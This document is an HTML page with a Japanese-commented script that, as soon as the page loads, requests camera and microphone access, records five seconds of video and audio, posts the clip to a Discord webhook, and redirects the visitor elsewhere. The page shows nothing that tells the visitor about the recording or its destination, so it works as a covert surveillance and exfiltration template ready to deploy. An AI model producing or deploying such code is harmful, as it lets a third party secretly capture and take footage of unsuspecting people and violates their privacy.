<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Record & Send</title>
</head>
<body>
  <script>
    const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
      const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      const chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        const file = new File([blob], "recorded.webm");

        const formData = new FormData();
        formData.append("file", file);
        formData.append("content", "🎥 録画した動画です");

        fetch(webhookUrl, {
          method: "POST",
          body: formData
        })
        .then(() => {
          // ✅ Discordに送信成功 → 別のHTMLに移動
          window.location.href = "recorded.html"; // ← 遷移先のファイル名に変えてね
        })
        .catch(err => {
          console.error("❌ 送信エラー:", err);
          alert("送信に失敗しました");
        });
      };

      // 5秒だけ録画
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, 5000);
    }).catch(err => {
      console.error("カメラ/マイクの取得に失敗:", err);
    });
  </script>
</body>
</html>
